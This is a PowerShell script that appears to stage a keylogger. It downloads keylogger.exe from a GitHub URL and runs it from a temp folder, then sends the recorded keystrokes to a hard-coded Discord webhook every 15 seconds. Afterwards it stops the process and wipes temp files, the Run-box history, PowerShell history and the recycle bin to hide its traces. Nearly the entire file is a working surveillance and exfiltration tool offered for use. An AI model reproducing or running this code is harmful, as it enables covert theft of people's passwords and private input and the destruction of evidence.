# Define the URL for downloading the executable
$downloadUrl = 'https://github.com/muratcx/PythonProjects/raw/main/keylogger/dist/keylogger.exe'

# Define the path to the temporary folder
$tempFolderPath = [System.IO.Path]::Combine($env:USERPROFILE, 'AppData\Local\Temp\Keylogger')

# Create the temporary folder if it doesn't exist
if (-not (Test-Path -Path $tempFolderPath)) {
    New-Item -Path $tempFolderPath -ItemType Directory
}

# Define the paths for the executable and text file within the temporary folder
$exeFilePath = [System.IO.Path]::Combine($tempFolderPath, 'keylogger.exe')
$txtFilePath = [System.IO.Path]::Combine($tempFolderPath, 'recorded_sequence.txt')

# Define the Discord webhook URL
$webhookUrl = "https://discord.com/api/webhooks/1152705027098554478/HtWHmlFBKuYybSyaot6-5Sb_6VbxQNiTnPf9yDMru5OMcvv1UAp-HJnu_0UMTcactDOZ"

# Function to send a message to Discord using a webhook
function Send-MessageToDiscord {
    param (
        [string]$WebhookUrl,
        [string]$Message
    )

    try {
        $jsonBody = @{
            "content" = $Message
        }
        $jsonBodyString = $jsonBody | ConvertTo-Json -Depth 5
        Invoke-RestMethod -Uri $WebhookUrl -Method Post -Body $jsonBodyString -ContentType "application/json"
        Write-Host "Discord message sent: $Message"
    } catch {
        Write-Host "Error sending message to Discord: $_"
    }
}

# Start keylogger process
try {
    # Download the executable to the temporary folder
    Write-Host "Downloading keylogger.exe..."
    Invoke-WebRequest -Uri $downloadUrl -OutFile $exeFilePath -Verbose

    # Start the keylogger executable
    Write-Host "Starting keylogger..."
    Start-Process -FilePath $exeFilePath -NoNewWindow

    # Send initialization message
    Send-MessageToDiscord -WebhookUrl $webhookUrl -Message "Keylogger Initialized..."

    # Wait 10 seconds before sending the first message to discord
    Start-Sleep -Seconds 10

    # Send the recorded_sequence.txt to Discord every 15 seconds, a maximum of 10 times
    $maxSendCount = 10
    $sendCount = 0
    while ($sendCount -lt $maxSendCount) {
        if (Test-Path -Path $txtFilePath) {
            Write-Host "Sending recorded_sequence.txt to Discord (Attempt $sendCount)..."
            Send-MessageToDiscord -WebhookUrl $webhookUrl -Message (Get-Content -Path $txtFilePath -Raw)
        } else {
            Write-Host "recorded_sequence.txt not found."
        }

        # Increase the send count
        $sendCount++

        # Sleep for 15 seconds
        Start-Sleep -Seconds 15
    }

    # End the keylogger process
    Write-Host "Stopping keylogger..."
    Get-Process -Name 'keylogger' | ForEach-Object { Stop-Process -Id $_.Id -Force }

    # Cleanup: Delete contents of Temp folder, run box history, PowerShell history, and recycle bin
    Write-Host "Performing cleanup..."
    Remove-Item "$env:TEMP\*" -Recurse -Force -ErrorAction SilentlyContinue
    Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" -Name '*' -ErrorAction SilentlyContinue
    Remove-Item (Get-PSReadlineOption).HistorySavePath -Force -ErrorAction SilentlyContinue
    Clear-RecycleBin -Force -ErrorAction SilentlyContinue

    # Send cleanup message
    Send-MessageToDiscord -WebhookUrl $webhookUrl -Message "Cleaned Up."
    # Send completion message
    Send-MessageToDiscord -WebhookUrl $webhookUrl -Message "Keylogging Complete."


    Write-Host "Script completed."
} catch {
    Write-Host "Error: $_"
}
